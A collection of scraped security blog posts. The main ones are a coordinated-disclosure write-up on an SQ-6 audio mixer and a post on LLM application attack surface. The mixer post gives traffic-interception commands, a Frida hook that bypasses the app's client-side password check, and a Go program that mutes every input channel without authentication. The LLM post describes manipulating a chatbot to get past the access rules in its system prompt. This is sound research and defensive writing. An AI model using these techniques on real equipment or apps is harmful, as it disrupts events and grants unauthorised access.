OSV-SCALIBR’s features available in OSV-Scanner, we're also working on additional new capabilities. Here's some of the things you can expect:\nSupport for more OS and language ecosystems, both for regular extraction and for Guided Remediation\nLayer attribution and base image identification for container scanning\nReachability analysis to reduce false positive vulnerability matches\nMore vulnerability and misconfiguration detectors for Windows\nMore weak credentials detectors\nWe hope that this library helps developers and organizations to secure their software and encourages the open source community to contribute back by sharing new plugins on top of OSV-SCALIBR.\nPost a Comment", "timestamp": "2025-10-21T13:34:06.224907"}
{"source": "blog", "feed": "https://security.googleblog.com/feeds/posts/default", "title": "Google Cloud expands vulnerability detection for Artifact Registry using OSV", "url": "http://security.googleblog.com/2024/12/google-cloud-expands-vulnerability.html", "published": "2024-12-10T13:11:00.005-05:00", "content": "DevOps teams dedicated to securing their supply chain and predicting potential risks consistently face novel threats. Fortunately, they can now improve their image and container security by harnessing Google-grade vulnerability scanning, which offers expanded open-source coverage. A significant benefit of utilizing Google Cloud Platform is its integrated security tools, including Artifact Analysis. This scanning service leverages the same infrastructure that Google depends on to monitor vulnerabilities within its internal systems and software supply chains.\nArtifact Analysis has recently expanded its scanning coverage to eight additional language packages, four operating systems, and two extensively utilized base images, making it a more robust and versatile tool than ever before.\nThis enhanced coverage was achieved by integrating Artifact Analysis with the Open Source Vulnerabilities (OSV) platform and database. This integration provides industry-leading insights into open source vulnerabilities—a crucial capability as software supply chain attacks continue to grow in frequency and complexity, impacting organizations reliant on open source software.\nWith these recent updates, customers can now successfully scan the vast majority of the images they push to Artifact Registry. These successful scans ensure that any known vulnerabilities are detected, reported, and can be integrated into a broader vulnerability management program, allowing teams to take prompt action.\nArtifact Analysis pulls vulnerability information directly from OSV, which is the only open source, distributed vulnerability database that gets information directly from open source practitioners. OSV’s database provides a consistent, high quality, high fidelity database of vulnerabilities from authoritative sources who have adopted the OSV schema. This ensures the database has accurate information to reliably match software dependencies to known vulnerabilities—previously a difficult process reliant on inaccurate mechanisms such as CPEs (Common Platform Enumerations).\nOver the past three years, OSV has increased its total coverage to 28 language and OS ecosystems. For example, industry leaders such as GitHub, Chainguard, and Ubuntu, as well as open source ecosystems such as Rust and Python are now exporting their vulnerability discoveries in the OSV Schema. This increased coverage also includes Chainguard’s Wolfi images and Google’s Distroless images, which are popular choices for minimal container images used by many developers and organizations. Customers who rely on distroless images can count on Artifact Analysis scanning to support their minimal container image initiatives. Each expansion in OSV’s coverage is incorporated into scanning tools that integrate with the OSV database.\nAs a result of OSV’s expansion, scanners like Artifact Analysis that draw from OSV now alert users to higher quality vulnerability information across a broader set of ecosystems—meaning GCP project owners will be made aware of a more complete set of vulnerability findings and potential security risks.\nExisting Artifact Registry scanning customers don't need to take any action to take advantage of this update. Projects that have scanning enabled will immediately benefit from this expanded coverage and vulnerability findings will continue to be available in the Artifact Registry UI, Container Analysis API, and via pub/sub (for workflows).\nExisting On Demand scanning customers will also benefit from this expanded vulnerability coverage. All the same Operating Systems and Language package coverage that Registry Scanning customers enjoy are available in On Demand Scan.\nWe know that detection is just one of the first steps necessary to manage risks. We’re continually expanding Artifact Analysis capabilities and in 2025 we’ll be integrating Artifact Registry vulnerability findings with Google Cloud’s Security Command Center. Through Security Command Center customers can maintain a more comprehensive vulnerability management program, and prioritize risk across a number of different dimensions.\nPost a Comment", "timestamp": "2025-10-21T13:34:07.049585"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "Production Security, Not That Kind", "url": "https://blog.includesecurity.com/2025/10/production-security-not-that-kind/", "published": "Fri, 03 Oct 2025 19:33:51 +0000", "content": "Our consulting team has a large variety of interests outside of security, although that doesn’t mean we take our hacker hats off outside our security work. The AVL (audio, visual, lighting) industry is an area of interest for me as I help run production outside of Include Security, mainly focusing on live sound. In this blog post we take a look at the security of an audio mixer made by Allen & Heath called the SQ-6.\nThe SQ-6 is a popular mid-range mixer that goes for around $5,000. Other brands that compete in this range would be Yamaha, Midas, and Behringer. We don’t make any claims that Allen & Heath is more or less secure than the competitors. We chose to look at Allen & Heath as one of the big players in the industry. Join us as we explore a professional live audio mixer and you’ll never look at concerts the same way again.\nWhat is an Audio Mixer?\nLet’s talk a little about what an audio mixer does first before we dive in further. These mixers or “boards” are most commonly used at live events. They are usually placed in the center of the audience facing the front of the main speakers so that a sound engineer can mix and process all the different stage inputs for the audience.\nAs an aside, if you see a second mixer on the side of the stage, that monitor engineer is also mixing audio, but specifically for individual mixes for each musician’s in-ears, which are in-ear headphones that have sound isolation. Alternatively, the monitor engineer will be mixing floor monitors or wedges on the stage if the musician doesn’t have in-ears. If the event is being live streamed as well, then it is very likely that there is a third sound engineer in a room separate from the live event hall that is mixing for the live stream. That’s a lot of different people that need to take the signal from all the microphones and instruments on stage and process it for different target audiences.\nThanks to computers and networking, it’s much easier to do that these days than it was in the traditional world of analog mixers, long snakes (multicore cables), and splitters. Now we have digital stage boxes that are plugged in a network over CAT6 and each mixer can subscribe to multicast audio streams and set up virtual patching across all equipment. Below is an example of an Allen & Heath digital stage box where musicians would plug in their instruments and microphones on stage.\nSome manufacturers have their own proprietary protocols for audio streaming such as Allen & Heath’s SLink, but there are also industry standard solutions such as Dante, which is proprietary but brand agnostic. There are also open standards such as MADI/AES10 and AES67 which are defined by the Audio Engineering Society and have open source implementations. Dante, for example, is also compatible with AES67.\nAttack Surface Overview\nWhat scenario would a mixer be used in and what are the risks? Any live event, physical or broadcasted, will use some type of mixer. Interruption of the event by modifying, distorting, or disabling the sound is the main risk. This can span entertainment events, political events, conferences, and corporate meetings, to name a few.\nIn this case I took a look at an Allen Heath SQ-6 mixer with the latest firmware, which at the time was version 1.6.0 r4812. In addition, there were three mobile apps released at the time that were all on version 1.6.0. The apps, SQ MixPad, SQ4You, and SQ Control were all available for both iOS and Android.\nAudio Network\nI mentioned that audio is streamed over a network (SLink, Dante, MADI, AES67). Allen & Heath mixers offer SLink by default, but have support for additional protocols through network interface modules, such as a Dante module. We won’t be looking at this as an attack surface since this is the most likely network to be isolated, although not necessarily. The audio network has a separate ethernet port from the control network, but it’s still an IP network. With that being said, if you have access to this network it’s game over and you will be able to disrupt the sound.\nControl Network\nThe SQ-6 also has a second ethernet port where the mixer can be plugged into a network and exposes various control network services. The following image shows the network interface which is used for the control network.\nIn particular, the following network ports were discovered through network scans and network traffic analysis:\n- 51326 (TCP) – App Control\n- 51324 (UDP) – App Updates\n- 51325 (TCP) – MIDI\nThe app network services appeared to be using custom protocols and the MIDI service protocol was publicly documented by Allen & Heath in their SQ MIDI Protocol Manual (PDF).\nMobile Apps\nLet’s talk about mobile apps. When are these used? Almost every brand has companion apps that target mainly two groups: the sound engineer and musicians. The SQ MixPad app gives the sound engineer the ability to control the entire mixer wirelessly. This is helpful to be able to move around the room to see how it sounds in different areas. In the case of not having a dedicated monitor sound engineer, it also allows the sound engineer to go on stage and mix the individual floor monitor mixes.\nThe SQ4You app is more limited in functionality and is intended for each musician to be able to mix for their own monitor mix. Again, this is useful when you don’t have a dedicated monitor sound engineer so that a sound engineer can focus on the main mix and not have to adjust the mix for each musician. The third app, SQ Control, is meant for creating basic dashboards to be able to control just a few aspects of the mixer, such as changing volume or muting a microphone. All these apps communicate with the same app network services exposed by the mixer.\nThe MIDI service, on the other hand, is meant to be used by other software to either automate control of the mixer or to create automation based on events from the mixer. Companion is a very popular open source project used for automation that also includes integrations for Allen & Heath mixers over MIDI. Alternatively, Q-SYS is a big name in control systems that can also integrate with Allen & Heath mixers.\nBy default, any user with access to the network can access the app services and the MIDI service without any type of authentication. Since musicians and sound engineers need to access the services wirelessly there will either be a dedicated Wi-Fi network or the mixer can be put on a shared corporate network that has access points. The mixer can also be configured with multiple usernames and passwords each with varying levels of permissions. I went ahead and enabled this functionality to see if there was any way that it could be bypassed. This functionality was described in the SQ Reference Guide (PDF), as shown below:\nPhysical\nHaving physical access to the board means that you can access the physical faders and touch screen to be able to control the mix. But, there is also the possibility to set up users and roles so that sound engineers have their own personalized configuration and/or have limited functionality. In general, once you have physical access you can disrupt the sound, but in a sense privilege escalation can also occur. There are also two USB ports, ethernet ports, and support for expansion modules.\nMobile Applications\nOut of the three applications I focused on the Android SQ MixPad app since it implemented the most functionality. The attack scenario I was looking at was authentication bypass when a mixer has users configured with a password.\nNetwork Traffic\nThe first step was to intercept network traffic between the mobile application and mixer. I decided to do this with some iptables rules.\nThe following represents the clients that were on the network:\n- Mixer: 192.168.0.44\n- Mobile Device: 192.168.0.208\n- Laptop: 192.168.0.30\n1. Route and NAT all traffic from the mobile device to the mixer.\nsudo iptables -t nat -A PREROUTING -s 192.168.0.208 -d 192.168.0.44 -j DNAT --to-destination 192.168.0.30\n2. Route and NAT all traffic from the mixer to the mobile device.\nsudo iptables -t nat -A PREROUTING -s 192.168.0.30 -d 192.168.0.44 -j DNAT --to-destination 192.168.0.208\n3. Enable NAT for all clients in the 192.168.0.0/24 network.\nsudo iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j MASQUERADE\n4. Enable IP forwarding\nsudo sysctl -w net.ipv4.ip_forward=1 sudo iptables -P FORWARD ACCEPT\nWith all that set up, in the mobile application I set the mixer as 192.168.0.30, which was my laptop, so that I can intercept all the traffic using Wireshark while also forwarding traffic between the mixer and mobile application. This worked perfectly and gave me insight of what was going over the wire. There was traffic over UDP port 51324 and whenever there was a live interaction with the mixer or application, TCP traffic over TCP port 51326 occurred. The UDP and TCP data did not seem to be using a standard protocol and would require further investigation. With authentication enabled on the mixer, I found it interesting that whenever entering a password and getting denied, there was no TCP traffic that occurred. This made me wonder if the application received the usernames and passwords and then just performed client-side authentication. Sure enough, when making a connection to the mixer from the app, the following data, which clearly shows the usernames from the mixer.\nContinuing to inspect the traffic, I noticed that every time that a password change occurred on the mixer, an update message was sent to all devices connected to the TCP port 51326 service. These updates were received before any authentication. I started to see a trend with the packets as I changed the password for two different users.\nUpdate UID 10 password to “password”.\nUpdate UID 0 password to “password”.\nThe first 9 bytes 7f 08 0b 00 00 00 5b 23 0e appeared to be a header for the password update, the following byte 0a and 00 was the UID and the final 8 bytes were some representation of the password. This was possibly a custom hashing algorithm.\nIn this case, the password “password” was represented as hex 32 5d 44 62. The password “change” was represented as hex 59 b8 30 6a and a blank password was represented as hex 88 97 1d d2.\nAndroid Reversing\nLooking directly at the Android APK, I started off by decompiling the Android app using jadx. I quickly found that a lot of the functionality was implemented via native QT libraries. This doesn’t easily decompile and would require reverse engineering using a tool such as Ghidra. Because of this I decided to go with the path of least resistance and to use Frida to see if I can find the relevant function that needed to be hooked. Using frida-trace I started tracing function calls that matched *assword, just to account for capitalization differences. With the trace started, I went ahead and attempted to login with a wrong password and saw the following function calls.\n> frida-trace -U -i \"*assword*\" 4159 …omitted for brevity… /* TID 0x105a */ 16383 ms _ZN24cQtUserPermissionManager15passwordMatchesEi7QString() 16383 ms | _ZN24cQtUserPermissionManager16HashFromPasswordE7QString() 16384 ms | | EncryptPassword()\nHmm, so there is both a HashFromPassword and EncryptPassword function call? Maybe the client is hashing the password and encrypting it before doing a local comparison. Either way, I decided to hook the first function called, which was _ZN24cQtUserPermissionManager15passwordMatchesEi7QString and just modify the return value there. The following Frida script hooks this function which was part of the libSQ-MixPad_arm64-v8a.so module. A quick way that I found out which module this function was part of was to run strings on the modules in the app/src/main/lib/arm64-v8a directory of the extracted APK.\n> strings * -f | grep _ZN24cQtUserPermi ssionManager15passwordMatchesEi7QString libSQ-MixPad_arm64-v8a.so: _ZN24cQtUserPermissionManager15passwordMatchesEi7QString\nIn the Frida script, I defined an interceptor that modifies the return value function to always return true.\n//JavaScript const funPtr = Module.getExportByName(\"libSQ-MixPad_arm64-v8a.so\", \"_ZN24cQtUserPermissionManager15passwordMatchesEi7QString\"); Interceptor.attach(funPtr, { onEnter(args) { console.log(\"hello\"); }, onLeave(retval) { const retvalOne:NativePointer = ptr(0x1); retval.replace(retvalOne); } });\nNow when the user provides a password, the _ZN24cQtUserPermissionManager15passwordMatchesEi7QString function will always return true no matter if the provided password matches the hashed/encrypted password from the mixer. As a result, any password is accepted and we bypassed authentication!\nLive patching requires the mobile device to be tethered to a laptop, but using the wonderful frida-gadget tool I was able to patch the Android APK with this hook to have a completely portable auth-bypassing SQ MixPad application.\nLater, while browsing the Allen & Heath forums, I found an interesting post by a user talking about a third-party mobile app called Mixing Station. The main takeaways from this post were:\n- A third-party application called Mixing Station had users who were surprised to see that musicians were able to access the entire mixer without a password.\n- The developer acknowledged that he didn’t know how to process passwords stored by the SQ mixer so the app defaulted to allowing access without a password.\n- Later the developer later figured out how to implement client-side password validation and updated the app to do so.\nWhile this would prevent your typical user of the Mixing Station app from accessing administrative functionality on a mixer without providing a password, the underlying issue was still present.\nNetwork MIDI\nThe MIDI service was also available over the network on TCP port 51325. According to the SQ MIDI Protocol manual, MIDI is available over USB and over the network. The manual also documented the protocol for communicating with the MIDI service. I created a small program to send MIDI commands over the network. In particular, what we did here is create MIDI messages to mute 48 input channels. There is no authentication and as a result an attacker can disrupt the sound if they can reach the mixer over the network.\n//Go package main import ( \"fmt\" \"net\" ) func main() { const ( HOST = \"192.168.0.30\" PORT = \"51325\" TYPE = \"tcp\" ) tcpServer, err := net.ResolveTCPAddr(TYPE, HOST+\":\"+PORT) if err != nil { panic(err) } conn, err := net.DialTCP(TYPE, nil, tcpServer) if err != nil { panic(err) } defer conn.Close() var messages []byte bn := byte(0xb0) // MIDI channel msb := byte(0) // Mute all 48 input channels for i := 0; i < 48; i++ { lsb := byte(i) current := []byte{bn, 0x63, msb, bn, 0x62, lsb, bn, 0x60, 0x00} messages = append(messages, current...) } fmt.Printf(\"%x\\n\", messages) _, err = conn.Write(messages) if err != nil { panic(err) } }\nThis small proof of concept serves to show that the MIDI service can be accessed without authentication, but the actual functionality exposed is much more exhaustive including: scene changes, mutes, panning, volume levels, and modification of mix assignments.\nConclusion\nLooking at the user login functionality, I found that there is no form of server-side (mixer) authentication and that the applications implemented this functionality client-side. I was also not the first to notice this as I discovered through some forum posts of discontent users using a third-party application. The MIDI service was also fully accessible without any authentication. With all this said, none of the traffic between applications and network services was encrypted and even with authentication in place, an attacker could still read or modify traffic when in the same broadcast domain. Because of this, a dedicated network and access point is a must. Additionally, access to the network should only be given to trusted devices. Ideally these devices are owned and controlled by the AVL team and are not the personal devices of individuals.\nFurther investigation around firmware updates, protocol analysis, and sound streaming networks would be good next areas of focus. At the same time, not having security controls in place in the first place means there isn’t anything to bypass, which is the case for a lot of pro AVL equipment. You can’t hack something that is already open.\nGuidance for Defenders\nThe trend with AVL equipment is that they tend to rely on dedicated networks with restricted access as a security measure. This is a reasonable approach with the current status quo. For network defenders that are dealing with this type of equipment, ensure that network segmentation is in place through the usage of VLANs, firewalls, and dedicated APs. If completely separate network infrastructure can be afforded, that is preferred, both for security and the stability of streaming audio networks. In general, always prevent internet access to these devices unless absolutely needed. In the example of this Allen and Heath mixer, the only reason that internet access would be needed would be to download the Android and iOS applications, but this can be done beforehand on a different network.\nAVL Industry Call-to-action:\nFor those working in this industry I would recommend that the assumption of depending on dedicated networks with restricted access be challenged. Restricted network access should not be the default assumption. The future brings more integrations and connectivity with applications (Wi-FI and shared networks), automation with third-party software (including cloud), and OTA software updates. The industry currently prioritizes having stable systems for professional-level events, with security design largely being an afterthought. I’d love to see more companies become proactive with the security of their designs. This might mean that there has to be more standardization of secure protocols or a collaboration between AVL companies. Any company in the industry has the opportunity to take initiative and set the trend for the rest to follow.\nDisclosure Timeline\nThis research was performed in coordination with Allen & Heath. We thank them for their support and we’d like to pass along a word of caution from the vendor for existing customers that they may violate their support/licensing agreements if they do similar research without collaborating with the Allen & Heath team.\nBelow is the disclosure timeline outlining the communication between Include Security and the Allen & Heath team. Their team was not only promptly responsive to our initial outreach, but also receptive to meeting for a details discussion, and were easy to work with when deciding on a timely publication date for our post once a software patch had been released.\n- 9/4/2025 – Initial outreach by Include Security to support@allen-heath.com describing the research, and requesting a response to coordinate further.\n- 9/10/2025 – Response from Allen & Heath team with a request to meet and discuss technical details and next steps.\n- 9/16/2025 – Meeting conducted with Allen & Heath team, productive conversation of discussing identified vulnerability details, their team’s remediation plan and timeline, and agreeing upon an Include Security blog post publication date.\n- 9/29/2025 – SQ MixPad application updates pushed to app stores (v1.6.1)\n- 10/3/2025 – Include Security publishes their research.", "timestamp": "2025-10-21T13:34:11.635129"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "LLMs in Applications – Understanding and Scoping Attack Surface", "url": "https://blog.includesecurity.com/2025/07/llms-in-applications-understanding-and-scoping-attack-surface/", "published": "Thu, 17 Jul 2025 19:01:53 +0000", "content": "Introduction\nOne of the most interesting aspects of consulting I see at Include Security is watching the application landscape change over time. Market demands and organizational requirements push the growth of new technologies, features and frameworks, while other technologies begin to fall out of favor.\nIn recent years, we’ve seen a significant increase in the use of Large Language Models (LLMs) as organizations across all industries work to add AI features to their products and services, or even create new offerings surrounding AI.\nThere’s no shortage of information regarding LLMs themselves and implementing LLMs into applications – and on the IncludeSec blog we’ve addressed some common vulnerabilities LLMs may face in a previous post, as well as its follow-up post. We also collaborated with Consumer Reports to show how even seemingly-remediated LLM vulnerabilities might still be exploitable.\nThis time around, we wanted to take a bit of a different approach. In this post, we aim to address two common questions:\n- How does an application’s use of AI impact its attack surface?\n- How can we use that information to more accurately scope application security assessments?\nHowever, to understand why these questions matter, we first must understand the importance of scoping itself and how attack surface impacts scoping.\nWhy Scoping Matters in Application Pentesting\nScoping in the application pentesting context is the process of determining many important aspects of an assessment. Of those aspects, two of the most significant are:\n- Which components of an application must be included in the assessment?\n- How much time needs to be allocated for that particular assessment?\nGenerally speaking, the larger an application, the more time a security assessment will require. However, optimally scoping an assessment is essential when it comes to aligning the needs of an organization with the level of assurance provided.\nScoping too much time can begin to approach diminishing returns as more hours are spent on an application than necessary to cover all of the test cases. Conversely, scoping too little time can lead either to missing some test cases or reducing the level of assurance below an organization’s requirements.\nUnderstanding the Attack Surface of an LLM\nFor this post, we’ll be considering a hypothetical scenario in which a post-training LLM is being leveraged by an application to perform various functions. We’ll save analysis of exploiting an LLM directly via manipulated training data for another post!\nThe first step to understanding the attack surface for an LLM implementation within an application is to understand what that LLM is used for, and what access that might entail based on its purpose. Below are a few of the many examples that could apply here.\nA chatbot intended to help with customer support requests\n- What types of requests can it help a user with?\n- Does it only provide data from documentation?\n- Does it have access to a state-changing API, such as a reset password function?\nA tool designed to help generate or revise content for a user\n- What user data can the tool access when generating content?\n- Is any of that data considered confidential or otherwise privileged?\n- Where and how is this data processed? Is it merged with other user data?\n- Where is this generated content sent or stored? Is it rendered in a user’s browser?\nThe most important question to consider from the above – “what can the model access?” Because we know that LLMs can often be affected by many potential types of attacks, if a model can access either privileged data or functionality, and a user can access the LLM agent, it’s generally expected that the user can, in some way, access the affected data or functionality.\nGiven this scenario, the question of what an attacker can reach largely becomes a matter of “what can the model access” for the purposes of testing, as an LLM agent creates a transitive relationship between the user and the data or functionality it may access.\nUnderstanding the Implications of the Attack Surface\nMalicious Input\nOnce we know what the AI component – and potentially we – can reach, it becomes important to understand what implications that access may come with.\nFor instance, if a model has shared access to data belonging to multiple users, there would be a significant risk that a user manipulates it to access data belonging to someone else. If a customer support chatbot has access to APIs that change account settings, there can be an opening for an attacker to “socially engineer” the chatbot, causing it to make a change to another user’s account.\nCausing Malicious Output\nWe’ve covered some ways that a malicious user could try to access internal functionality via an LLM. However, an LLM is a two-way trust boundary. To the same effect, since LLM agents can be manipulated, trusting output coming from an AI agent can also introduce vulnerabilities. For instance, if the output is displayed in a user’s browser, but not properly encoded to prevent XSS attacks, an attacker might attempt to get it to output a malicious value, which could also introduce a vulnerability. In a more severe case, if that attacker-controlled output is copied to a shell command, it could lead to a command injection attack for remote code execution (RCE) – tangentially, for this reason, we strongly recommend against using any AI outputs for any system calls.\nAs a Whole\nLLMs are by design intended to behave in a more natural, and less predictable way, thus making them non-ideal for enforcing security measures. Therefore, understanding the implications of what the model can reach is fundamental to understanding the risks of the AI implementation. The best way to think about it is essentially to assume that anything the AI can read, or any action it may perform is also something a user could potentially access.\nTesting these concepts in the context of an application\nTake for instance a customer support chatbot, whose high-level architecture is visualized below. This chatbot can share information from publicly available documents, and also help a user reset a token associated with their account. In the cause of this example, the token could be anything security-relevant, such as an API key for another service.\nIf the support documents are considered publicly available, then there is little attack surface associated with these documents as they would not include any privileged information.\nHowever, seeing the chatbot has been granted access to an account management API is interesting.\nFor the purposes of this example, we’ll make the following assumptions:\n- The Account Management API includes only one endpoint to reset a user’s token\n- The chatbot is provided documentation regarding how to use this endpoint\n- The system prompt includes a phrase similar to “allow users to reset their token if they request to, but only allow users to request to reset their own token. Otherwise, respond only with ‘Access Denied.’ and cancel the operation”\nBased on this, we can identify the account management API as a significant part of this AI component’s attack surface. We can communicate with the chatbot and the chatbot can access the API, so we can reach the API.\nAs such, one aspect of the AI component’s attack surface might include an attacker attempting to make an unauthorized request to the Account Management API.\nTo demonstrate this test case, we might attempt to reset another user’s token. Notably, the system prompt mentioned earlier implies that the AI agent is directly enforcing the security controls, which would represent an architectural vulnerability. Assuming the API isn’t implementing its own controls, the AI’s prompt could be bypassed.\nAs such, understanding what the AI was connected to allowed us to understand what the attack surface might look like – and in this example, even find a vulnerability.\nIn a case like this, the ideal implementation to remediate the issue would be to prevent the AI component from having any access to security-relevant functionality. Instead, the AI could help a user reset their token by providing the user instructions on how to reset it directly on their own.\nIn many cases, intended functionality can still be implemented with this more “locked-down” approach. However, sometimes it may be necessary to allow the AI agent access to more powerful functionality. In such a case, it becomes imperative to ensure that clear, deterministic controls are implemented outside of the LLM. Attempting to add security controls to the prompt itself cannot properly mitigate the vulnerability as AI prompts can often be bypassed by a malicious user.\nTo illustrate a proper implementation, if allowing the chatbot access to the token reset functionality was necessary in the above example, the LLM agent could generate only parameters or a request body. In this case, authentication and authorization would be handled elsewhere, such as via a user’s token in a header that the LLM agent could not access.\nA request implemented this way may look similar to the following, with the AI only able to control the fields highlighted with red text.\nPOST /api/v1/LLM_API_Wrapper HTTP/2\nHOST: Example.com\nAuthorization: Bearer [User’s API Token]\n{\n“Action”:”UpdateToken”\n}\nAs all controls would reference the Authorization header, which the LLM would not be able to reach, the LLM agent could still provide the intended functionality to the user without allowing any additional access that a malicious user might exploit; a user would otherwise be able to make this request on their own. Once the request is sent, the UI could show a confirmation prompt to the user, confirming that the action was intended before allowing it to be completed.\nThe key with this implementation is that the AI can help formulate the requests subject to separate security controls, but may not unilaterally interact with the API on its own, addressing the architectural flaw in the diagram.\nConclusion\nOnce the attack surface is determined, the scoping process becomes much clearer. Time should be allocated for thoroughly exploring various test cases where all LLM functionality within the application is exercised. Ultimately, just as a web browser serves as an interface for users to interact with a web application, AI components can often (at least from the context of a web application) function in a similar way – as a means by which a user can interact with the logic that’s ultimately being used (or in this case reviewed).\nWhen access to privileged data or functionality is not strictly controlled by an application, it often leads to authorization vulnerabilities exploitable by malicious users. Such is often the same for data or functionality left accessible to an LLM without clear security controls governing this access.\nAs such, when scoping, if the AI component has minimal access, perhaps we can reduce the hours scoped as it takes less time to meaningfully test these features. If the AI has further-reaching capabilities, then spending more time testing it may represent the stronger value, as we’d want to ensure the full attack surface is adequately covered.\nFrom a development standpoint, this idea can be used to reduce attack surface as well. Essentially, a security-focused approach to integrating AI from an architectural standpoint can be summarized with a few key ideas:\n- Only allow an AI component to access data that the user interacting with it may already access.\n- Only allow an AI component to perform actions that the user interacting with it may already perform, and require a user to confirm outside of the LLM (such as via a UI prompt) before performing any actions. Even so, consider having the AI only guide the user on how to perform the action rather than allowing the AI to do so directly.\n- Consider any input provided by the user to the AI agent to be untrusted data (as would already be the case with any user-provided data)\n- Consider any output provided from the AI agent to also be untrusted data, as a user may cause it to return a malicious value.", "timestamp": "2025-10-21T13:34:12.165300"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "Misinterpreted: What Penetration Test Reports Actually Mean", "url": "https://blog.includesecurity.com/2025/05/misinterpreted-what-penetration-test-reports-actually-mean/", "published": "Tue, 27 May 2025 16:27:16 +0000", "content": "“I can’t show this to my customers! I need a clean report!”\nAt Include Security, we put a lot of care into our penetration test reports. But over the years, we’ve noticed that our reports are sometimes interpreted in ways we did not intend. This is understandable. Different people, with different backgrounds, goals, and incentives, will naturally read the same document differently. That is the nature of communication. Still, we think it is worth clarifying some of our intentions and addressing some common misinterpretations. In this post, we’ll walk through the most common misconceptions we encounter and explain our perspectives as an expert pentesting team.\nWho Our Reports Are For\nAs we acknowledged above, interpretations of a report will depend on the reader. When we deliver a report, we have four primary audiences in mind:\nOur client. First and foremost, we are hired to help improve the security of a client’s technology. The report documents what we tested, what we found, and what we understand about the security posture of the system. The goal is to help our client make informed decisions about the security of their systems and applications.\nOur client’s customers. Many organizations purchasing products and services require evidence of third-party security assessments from their vendors. We take that responsibility of independent review seriously. When a customer reviews one of our reports, we want them to know that it was written with integrity and technical rigor.\nAuditors. Although we are not ourselves auditors, our penetration test reports are often used during compliance reviews or audits to demonstrate that testing has been performed. In these cases, our reports must clearly describe the scope, methodology, findings, and remediation status. Auditors must determine from this content whether compliance requirements have been met.\nOurselves. Many clients conduct periodic assessments of the same systems. While we take extensive internal notes, past reports are a key input to future assessments. They serve as part of our institutional memory, so they need to be thorough, accurate, and clear.\nAfter considering many report readout meetings, and post-delivery conversations with our clients, we’ve identified three misinterpretations requiring the most additional communication to find alignment on.\nMisinterpretation #1: Vulnerabilities are a sign of failure\nOn many occasions, we’ve received alarmed responses from clients about findings in the report. The clients expressed a concern like “I need to show this report to my customers, and if they see we have any vulnerabilities, they won’t want to do business with us.” We completely understand why a customer would want to avoid purchasing software with a poor record of security. However, the information in the report needs to be considered in the proper context. It is a snapshot in time. Vulnerabilities may have been recently added to the test environment during the latest feature development, and they may be resolved before being exposed to the world.\nWe have tested code from startups as well as established tech giants. We’ve examined code built with a wide range of programming languages and frameworks. Nobody is writing code that does anything interesting without occasionally introducing some security vulnerabilities.\nThe presence of vulnerabilities in a penetration test report does not necessarily represent any deficiency of the developers nor their software development process. Just as great writers benefit from editors, great engineers benefit from outside testers. A report with findings does not mean the team failed. It means security experts looked closely and found areas that could be improved.\nBy the time you’re reading this, this blog post will have been through several revisions and incorporated feedback from multiple readers/editors. It is considerably less complex than most software projects, and yet it still didn’t get everything right in the initial draft (and probably still didn’t in this published version either!).\nMisinterpretation #2: A “clean” report is always good news\nSome application tests result in a report with few or no vulnerabilities identified because the applications have been hardened over time and the core code has been subjected to repeated testing. With limited code changes between tests, the number and severity of vulnerabilities declines. This is great.\nHowever, many application tests reveal few findings for less comforting reasons:\n- The scope was very narrow. The whole system might have interesting functionality and potential risks, but the boundaries of the test did not permit all of it to be examined.\n- The time allotted was insufficient for complete coverage. Perhaps the budget only provided one week’s worth of testing for a very large application. Some testing is better than no testing, but without enough time to cover everything, assurance is reduced.\n- There were limitations in the test environment, such as: features weren’t fully functional, test data was absent, request rate limiting was enforced, databases were refreshed during testing, new code was deployed during testing, or test accounts weren’t available for all roles.\n- Only dynamic testing was performed (i.e. Blackbox); source code was not provided.\n- The skills of the assessment team were lacking. IncludeSec has an all-expert team, but that’s not true everywhere.\nMisinterpretation #3: It is necessary for every finding to be fixed.\nA finding in the report is not a demand for remediation. Penetration testing identifies technical risks. Whether or not to remediate those risks is a business decision. Penetration testers do not know the client’s budget, roadmap, risk tolerance, or the business value of each application or function. It is completely reasonable for a business to accept some risks and elect to not remediate certain vulnerabilities. That decision does not invalidate the finding, and it does not mean the finding is a false positive. It simply reflects that the cost to fix a vulnerability can be greater than the business benefit of remediation. In this case, we encourage our clients to document their reasoning for risk acceptance. We include their explanation in our remediation report so that interested parties can understand the full context.\nWhat Is Better Than a “Clean” Report?\nWe understand the appeal of a report with no findings. It feels like a win. But we believe there are better indicators of a strong security posture:\nRegular testing. One report is just a snapshot. Security is an ongoing process. Integrate secure development practices, code reviews, and internal QA into your software development lifecycle. Bring in third-party testers regularly to catch what might be missed internally.\nGood remediation reports. The contents of the initial report are only half the story. Confirmation that the identified vulnerabilities have been fixed is evidence that a client’s assurance process is achieving its aim of improving the application’s security.\nReports without caveats. A zero-finding report from a short, constrained, black-box test tells you less than a thorough test that uncovered real vulnerabilities and explained them clearly.\nReports from skilled, reputable testers. Testing is only as good as the people doing it. A short report might reflect a secure system, or it might reflect weak testing. A strong report demonstrates expertise by explaining how the system works and why certain classes of vulnerabilities were or were not present.\nFinal Thoughts\nPenetration test reports are tools for improving security. When read in the right context, even reports full of findings can be signs of a mature, proactive development culture. The goal isn’t a perfect report, it’s a stronger, more resilient system.", "timestamp": "2025-10-21T13:34:12.689941"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "Cross-Site WebSocket Hijacking Exploitation in 2025", "url": "https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/", "published": "Thu, 17 Apr 2025 18:59:37 +0000", "content": "Some of my favorite findings discovered during our client assessments at Include Security have exploited Cross-Site Websocket Hijacking (CSWSH) vulnerabilities. However, going back through those past findings, I realize that some of them wouldn’t work today in all browsers. This is due to improvements in baseline security in browsers around cross-origin requests. These improvements include Third Party Cookie Restrictions/Total Cookie Protection, and Private Network Access. CSWSH is a somewhat incidental casualty of these features, therefore I’ve not been able to find much discussion about the increasing limitations on CSWSH – apart from a passing mention in this excellent primer.\nThis blog post explores the current state of browser mitigations that make CSWSH harder to exploit. These will be explored together with three case studies of past findings, investigating which of the attacks still work today.\nCSWSH Recap\nA quick recap on CSWSH. It’s a vulnerability that arises because WebSockets are not protected by the most important browser security mechanism, the Same Origin Policy (SOP). The lack of SOP protection by default enables malicious websites to open WebSocket connections to targeted websites running WebSocket servers. A typical example: a user browses to attacker.com, client-side code running on attacker.com opens a WebSocket connection to bank.com, and the browser 